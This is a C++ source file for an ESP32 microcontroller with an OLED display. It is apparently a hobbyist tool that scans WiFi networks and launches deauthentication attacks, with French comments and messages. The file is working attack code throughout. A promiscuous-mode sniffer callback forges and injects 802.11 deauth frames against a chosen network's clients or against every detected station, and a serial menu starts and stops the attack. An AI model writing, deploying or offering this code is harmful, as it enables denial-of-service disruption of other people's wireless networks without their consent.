/* WiFi scan An D3auth attack by Retr0-dedsec2
   This example code is in the Public Domain (or CC0 licensed, at your option.)
   Unless required by applicable law or agreed to in writing, this
   software is distributed on an "AS IS" BASIS, WITHOUT WARRANTIES OR
   CONDITIONS OF ANY KIND, either express or implied.
*/

#include <stdio.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>
#include "sdkconfig.h"
#include <Arduino.h>
#include <WiFi.h>
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <esp_wifi.h>
#include "types.h"
#include "deauth.h"
#include "definitions.h"


deauth_frame_t deauth_frame;
int deauth_type = DEAUTH_TYPE_SINGLE;
int eliminated_stations;

// Configuration de l'écran OLED
#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
#define OLED_RESET    -1 
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);

int mode = 0; // 0: menu, 1: scan, 2: attack


// --- Fonction d'affichage utilitaire ---
void displayMsg(String title, String msg, int wait = 0) {
    display.clearDisplay();
    display.setTextSize(1);
    display.setTextColor(SSD1306_WHITE);
    display.setCursor(0,0);
    display.println(title);
    display.drawLine(0, 10, 128, 10, SSD1306_WHITE);
    display.setCursor(0, 20);
    display.setTextSize(1);
    display.println(msg);
    display.display();
    if(wait > 0) delay(wait);
}

void wifiScan() {
    Serial.println("--- Début du Scan WiFi ---");
    displayMsg("SCANNER WIFI", "Recherche en cours...", 0);

    // WiFi.scanNetworks(async, show_hidden, passive, max_ms_per_chan)
    int n = WiFi.scanNetworks();
    
    if (n == 0) {
        Serial.println("Aucun réseau trouvé.");
        displayMsg("RESULTAT", "Aucun reseau trouve.", 2000);
    } else {
        Serial.printf("%d réseaux trouvés :\n", n);
        
        for (int i = 0; i < n; ++i) {
            // Récupération des infos
            String ssid = WiFi.SSID(i);
            int32_t rssi = WiFi.RSSI(i);
            uint8_t channel = WiFi.channel(i);
            String encryption = (WiFi.encryptionType(i) == WIFI_AUTH_OPEN) ? "Ouvert" : "Securise";

            // Affichage Port Série
            Serial.printf("%d: %s | Ch:%d | RSSI:%d dBm | %s\n", i + 1, ssid.c_str(), channel, rssi, encryption.c_str());

            // Affichage OLED (défilement des réseaux)
            String stats = "CH: " + String(channel) + " | " + String(rssi) + "dBm\n" + encryption;
            displayMsg("Reseau " + String(i+1) + "/" + String(n), ssid + "\n" + stats);
            
            delay(1000); // Temps pour lire l'écran
        }
    }
    // Nettoyage de la mémoire du scan
    WiFi.scanDelete();
    Serial.println("--- Scan terminé ---\n");
}

esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);

IRAM_ATTR void sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
  const wifi_promiscuous_pkt_t *raw_packet = (wifi_promiscuous_pkt_t *)buf;
  const wifi_packet_t *packet = (wifi_packet_t *)raw_packet->payload;
  const mac_hdr_t *mac_header = &packet->hdr;

  // Ignore deauth frames to avoid errors
  if (type == WIFI_PKT_MGMT) {
    uint8_t subtype = (mac_header->frame_ctrl & 0x00F0) >> 4;
    if (subtype == 0xC) return;
  }

  const uint16_t packet_length = raw_packet->rx_ctrl.sig_len - sizeof(mac_hdr_t);

  if (packet_length < 0) return;

  if (deauth_type == DEAUTH_TYPE_SINGLE) {
    if (memcmp(mac_header->dest, deauth_frame.sender, 6) == 0) {
      memcpy(deauth_frame.station, mac_header->src, 6);
      for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++) esp_wifi_80211_tx(WIFI_IF_AP, &deauth_frame, sizeof(deauth_frame), false);
      eliminated_stations++;
    } else return;
  } else {
    if ((memcmp(mac_header->dest, mac_header->bssid, 6) == 0) && (memcmp(mac_header->dest, "\xFF\xFF\xFF\xFF\xFF\xFF", 6) != 0)) {
      memcpy(deauth_frame.station, mac_header->src, 6);
      memcpy(deauth_frame.access_point, mac_header->dest, 6);
      memcpy(deauth_frame.sender, mac_header->dest, 6);
      for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++) esp_wifi_80211_tx(WIFI_IF_STA, &deauth_frame, sizeof(deauth_frame), false);
    } else return;
  }

  char buffer_msg[64];
  snprintf(buffer_msg, sizeof(buffer_msg), "Sent %d frames to:\n%02X:%02X:%02X:%02X:%02X:%02X", 
           NUM_FRAMES_PER_DEAUTH, 
           mac_header->src[0], mac_header->src[1], mac_header->src[2], 
           mac_header->src[3], mac_header->src[4], mac_header->src[5]);

  DEBUG_PRINTF("Send %d Deauth-Frames to: %02X:%02X:%02X:%02X:%02X:%02X\n", NUM_FRAMES_PER_DEAUTH, mac_header->src[0], mac_header->src[1], mac_header->src[2], mac_header->src[3], mac_header->src[4], mac_header->src[5]);
  displayMsg("DEAUTH", buffer_msg, 2000);
}

void start_deauth(int wifi_number, int attack_type, uint16_t reason) {
  eliminated_stations = 0;
  deauth_type = attack_type;

  deauth_frame.reason = reason;

  if (deauth_type == DEAUTH_TYPE_SINGLE) {
    DEBUG_PRINT("Starting Deauth-Attack on network: ");
    displayMsg("DEAUTH", "Attaque en cours...", 0);
    DEBUG_PRINTLN(WiFi.SSID(wifi_number));
    displayMsg("DEAUTH", "Attaque en cours...\n" + WiFi.SSID(wifi_number));
    WiFi.softAP(AP_SSID, AP_PASS, WiFi.channel(wifi_number));
    memcpy(deauth_frame.access_point, WiFi.BSSID(wifi_number), 6);
    memcpy(deauth_frame.sender, WiFi.BSSID(wifi_number), 6);
  } else {
    DEBUG_PRINTLN("Starting Deauth-Attack on all detected stations!");
    displayMsg("DEAUTH", "Attaque en cours...\nTous les clients connectes!");
    WiFi.softAPdisconnect();
    WiFi.mode(WIFI_MODE_STA);
  }

  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_filter(&filt);
  esp_wifi_set_promiscuous_rx_cb(&sniffer);
}

void stop_deauth() {
  DEBUG_PRINTLN("Stopping Deauth-Attack..");
  esp_wifi_set_promiscuous(false);
}

// --- Logique principale ---
void setupLogic() {
    Serial.begin(115200);
    
    // Initialisation I2C pour l'OLED (SDA=21, SCL=22 par défaut sur ESP32)
    if(!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) { 
        Serial.println(F("Erreur: Ecran OLED non détecté"));
        for(;;); 
    }

    display.clearDisplay();
    displayMsg("SYSTEME", "Initialisation WiFi...", 1000);

    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);
}

#if !CONFIG_AUTOSTART_ARDUINO
void arduinoTask(void *pvParameter) {
    setupLogic();
    Serial.println("Menu: Appuyez sur 's' pour scanner, 'a' pour attaquer");
    while(1) {
        if (mode == 0) {
            if (Serial.available() > 0) {
                char c = Serial.read();
                if (c == 's') {
                    mode = 1;
                } else if (c == 'a') {
                    mode = 2;
                    start_deauth(0, DEAUTH_TYPE_ALL, 7);
                    Serial.println("Attaque deauth en cours. Appuyez sur 'q' pour arreter.");
                }
            }
        } else if (mode == 1) {
            wifiScan();
            mode = 0;
            Serial.println("Menu: 's' pour scanner, 'a' pour attaquer");
        } else if (mode == 2) {
            if (Serial.available() > 0) {
                char c = Serial.read();
                if (c == 'q') {
                    stop_deauth();
                    mode = 0;
                    Serial.println("Attaque arretee. Menu: 's' pour scanner, 'a' pour attaquer");
                }
            }
            delay(100);
        }
        delay(10); // small delay
    }
}

extern "C" void app_main() {
    initArduino();
    xTaskCreate(&arduinoTask, "arduino_task", 4096, NULL, 5, NULL);
}
#else
void setup() {
    setupLogic();
    Serial.println("Menu: Appuyez sur 's' pour scanner, 'a' pour attaquer");
}

void loop() {
    if (mode == 0) {
        if (Serial.available() > 0) {
            char c = Serial.read();
            if (c == 's') {
                mode = 1;
            } else if (c == 'a') {
                mode = 2;
                start_deauth(0, DEAUTH_TYPE_ALL, 7);
                Serial.println("Attaque deauth en cours. Appuyez sur 'q' pour arreter.");
            }
        }
    } else if (mode == 1) {
        wifiScan();
        mode = 0;
        Serial.println("Menu: 's' pour scanner, 'a' pour attaquer");
    } else if (mode == 2) {
        if (Serial.available() > 0) {
            char c = Serial.read();
            if (c == 'q') {
                stop_deauth();
                mode = 0;
                Serial.println("Attaque arretee. Menu: 's' pour scanner, 'a' pour attaquer");
            }
        }
        delay(100);
    }
}
#endif